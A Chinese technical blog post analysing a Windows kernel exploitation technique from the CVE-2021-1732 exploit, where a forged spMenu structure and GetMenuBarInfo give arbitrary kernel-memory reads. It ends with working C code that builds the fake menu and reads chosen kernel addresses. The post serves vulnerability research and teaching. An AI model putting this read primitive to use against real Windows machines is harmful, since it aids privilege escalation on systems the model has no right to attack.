---
title: GetMenuBarInfo 实现 Windows 内核任意地址读取
tags: windows
---
## 0x00 前言

此手法首次出现在 CVE-2021-1732 的 EXP 中，在获得任意地址写权限后，利用 user32!GetMenuBarInfo 函数与伪造的 spMenu 结构体进行内核读取。

## 0x01 分析

先附上tagWND 结构（[https://www.anquanke.com/post/id/241804#h3-12](https://www.anquanke.com/post/id/241804#h3-12)）：

```C
ptagWND(user layer)
    0x10 unknown
        0x00 pTEB
            0x220 pEPROCESS(of current process)
    0x18 unknown
        0x80 kernel desktop heap base
    0x28 ptagWNDk(kernel layer)
        0x00 hwnd
        0x08 kernel desktop heap base offset
        0x18 dwStyle
        0x58 Window Rect left
        0x5C Window Rect top
        0x98 spMenu(uninitialized)
        0xC8 cbWndExtra
        0xE8 dwExtraFlag
        0x128 pExtraBytes
    0x90 spMenu
        0x00 hMenu
        0x18 unknown0
            0x100 unknown
                0x00 pEPROCESS(of current process)
        0x28 unknown1
            0x2C cItems(for check)
        0x40 unknown2(for check)
        0x44 unknown3(for check)
        0x50 ptagWND
        0x58 rgItems
            0x00 unknown(for exploit)
        0x98 spMenuk
            0x00 pSelf
```


查看官方关于 GetMenuBarInfo 的解释：

```C
BOOL GetMenuBarInfo(
  HWND         hwnd,
  LONG         idObject, 
  LONG         idItem,
  PMENUBARINFO pmbi
);
```


 hwnd：窗口句柄

idObject： OBJID_CLIENT(与窗口关联的弹出菜单)、OBJID_MENU(与窗口关联的菜单栏)、OBJID_SYSMENU(与窗口关联的系统菜单)

idItem：用于检索信息的项。如果此参数为零，则该函数将检索有关菜单本身的信息。如果此参数为1时，则该函数将检索有关菜单上第一项的信息，以此类推。

pmbi：指向接收信息的MENUBARINFO结构的指针。请注意，在调用此函数之前，必须将cbSize成员设置为size of(MENUBARINFO)。

```C
typedef struct tagMENUBARINFO {
  DWORD cbSize;
  RECT  rcBar;
  HMENU hMenu;
  HWND  hwndMenu;
  BOOL  fBarFocused : 1;
  BOOL  fFocused : 1;
  BOOL  fUnused : 30;
} MENUBARINFO, *PMENUBARINFO, *LPMENUBARINFO;
```


结构体中第二个成员 rcBar 结构如下：

```C
typedef struct tagRECT {
  LONG left;
  LONG top;
  LONG right;
  LONG bottom;
} RECT, *PRECT, *NPRECT, *LPRECT;
```


IDA 导入 user32.dll，查看 user32!GetMenuBarInfo:

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100007.png)

可以看到 user32.dll 中并没有这个 API 的功能，而是又调用了一次

查看导入函数：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100010.png)

因此导入 win32kfull.sys，查看 win32u!NtUserMenuBarInfo：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100012.png)

根据user32!NtUserMenuBarInfo，美化一下

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100016.png)

可以看到 win32u!NtUserMenuBarInfo 会调用 xxxGetMenuBarInfo，且传入的参数为

xxxGetMenuBarInfo(ptagWnd, idObject, idItem, pmbi)。

对核心代码进行解析：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100019.png)

传入参数 idObject  为 -3 时，可触发此流程。

91行判断 pTagWndK + 0x1F &  0x40 是否等于 0，等于则触发流程，即 ptagWndk→dwStyle 不能包含WS_CHILD 。

后续代码中 idItems 多做偏移用，且需要 >0，故 idItems 赋值为 1。

由图中注释可知，此时进行的均为检查字段或赋值等操作，重点关注的几个参数：

```C
*(pmbi + 0x18) = pmbi->hMenu = spMenu->spMenuk->pSelf; // pSelf 是指向 spMenu 自身的指针
v37 = ptagWnd->ptagWndk;
v38 = 0x60 * idItem;
v39 = ptagWnd->spMenu->rgItems;
v40 = 0x60 * idItems + v39 -0x60 = v39 = ptagWnd->spMenu->rgItems;
```


![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100022.png)

116行判断通常会触发 else 分支。

else 分支是触发的关键，其实际含义为：

```C
v42 = (ptagWnd->spMenuk->rgItems + 0x40) + (ptagWnd->ptagWndK->left);
pmbi->tagRECT->left = v42;
pmbi->tagRECT->right = v42 + (ptagWnd->spMenu->rgItems + 0x48);
v43 = (ptagWnd->ptagWndk->top) + (ptagWnd->spMenuk->rgItems + 0x44); 
pmbi->tagRECT->top = v43;
v21 = v43 + (ptagWnd->spMenu->rgItems + 0x4C);

```


若 ptagWnd→ptagWndk→left与 ptagWnd->ptagWndk->top 均为 0，则代码含义为读取 ptagWnd→spMenuk→rgItems + 0x40 指向的值，按照代码一共可以读取16个字节，因此通过伪造 spMenu 结构，将 address - 0x40 作为 ptagWnd→spMenuk→rgItems ，就可以读取指定 address 的值，达到任意内核地址读的目的。

## 0x02 利用

整个过程利用的关键有两点：

1. 满足调用条件

2. 修改 spMenu

如何修改 spMenu 结构。

这里来看看 SetWindowLong：

```C
LONG SetWindowLong(
    HWND hWnd,               // handle to window
    int nIndex,              // offset of value to set
    LONG dwNewLong           // new value
);
```


SetWindowsLong 函数的功能是改变指定窗口的属性，第二个参数 nIndex 有多种选择：

![](https://gitee.com/tboom_is_here/pic/raw/master/img2/image_6.png)

用 ida 查看 user32!SetWindowLong：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100026.png)

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100028.png)

查看 win32u!NtuserSetWindoLong

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100055.png)

查看 win32u!xxxSetWindowLongPtr：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100100.png)

![](image/image_11.png)

查看 win32u!xxxSetWindowData：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100101.png)

这里看伪代码有点问题，切回汇编：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100103.png)

其表达的含义应为：

```C
if(nIndex != -4)
{
     switch(nIndex)
     {
         case -12:
             ptagWndk = *(ptagWnd) + 0x28;
             if(*(ptagWndk+0x1F) & 0xC0 == 0x40) //dwStyle 应带有 WS_CHILD 属性
             {
                 v11 = *(ptagWnd + 0x90); // 返回 spMenu
                 *(ptagWndk + 0x98) = dwNewLong;  //spMenu
                 *(ptagWndk + 0x90) = dwNewLong;
             }
       }
}
```


从这个过程可以看到，当调用 SetWindowLong 传入的参数 nIndex = -12，且dwStyle 应带有 WS_CHILD 属性时，就可以修改该窗口的 ptagWnd→ptagWndk→spMenu 为 传入的参数 dwNewLong。

因此当获得任意地址写权限后，整个操作流程如下：

- 创建窗口并获得窗口句柄 hWnd 以及 tagWnd→tagWndk

- 利用任意地址写，修改窗口 tagWnd→tagWndk→dwStyle 包含 WS_CHILD 属性

- 构造伪造的 spMenu

```C
    g_pMyMenu = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0xA0); // 在进程堆首地址新建一块 0xA0 大小的内存空间，为 g_pMyMenu
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x98) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x20);    // spMenu->spMenuk
    **(ULONG_PTR**)((PBYTE)g_pMyMenu + 0x98) = g_pMyMenu;   // spMenuk->pSelf
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x200);   // spMenu->unknow
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x8); //spMenu->rgItems
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) + 0x2C) = 1; // spMenu->unkonow->cItems==1
    *(DWORD*)((PBYTE)g_pMyMenu + 0x40) = 1; // check
    *(DWORD*)((PBYTE)g_pMyMenu + 0x44) = 2; // check
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = 0x4141414141414141; //rgItems->unknown，用到的时候再初始化 
```


- 利用 SetWindowLongPtr 修改窗口的 spMenu，并获得返回的原 spMenu_orgin

- 利用任意地址写，修改窗口 tagWnd→tagWndk→dwStyle 不包含 WS_CHILD 属性

- 调用 GetMenuBarInfo 实现任意地址读

```C
void ReadKernelMemoryQQWORD(ULONG_PTR pAddress, ULONG_PTR &ululOutVal1, ULONG_PTR &ululOutVal2)
{
    MENUBARINFO mbi = { 0 };
    mbi.cbSize = sizeof(MENUBARINFO);

    RECT Rect = { 0 };
    GetWindowRect(g_hWnd[1], &Rect); // 获取窗口 1 的 RECT 信息，用于计算读出的真实值

    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = pAddress - 0x40; // rgItems->unknown
    GetMenuBarInfo(g_hWnd[1], -3, 1, &mbi);

    BYTE pbKernelValue[16] = { 0 };
    *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;  // 减去 Rect.left，创建窗口时，该值被指定为 0
    *(DWORD*)(pbKernelValue + 4) = mbi.rcBar.top - Rect.top;    // 减去 Rect.top，创建窗口时，该值被指定为 0
    *(DWORD*)(pbKernelValue + 8) = mbi.rcBar.right - mbi.rcBar.left;
    *(DWORD*)(pbKernelValue + 0xc) = mbi.rcBar.bottom - mbi.rcBar.top;

    // 读取
    ululOutVal1 = *(ULONG_PTR*)(pbKernelValue);
    ululOutVal2 = *(ULONG_PTR*)(pbKernelValue + 8);
}
```



## 0x03 参考链接

[https://www.anquanke.com/post/id/241804](https://www.anquanke.com/post/id/241804#h3-12)



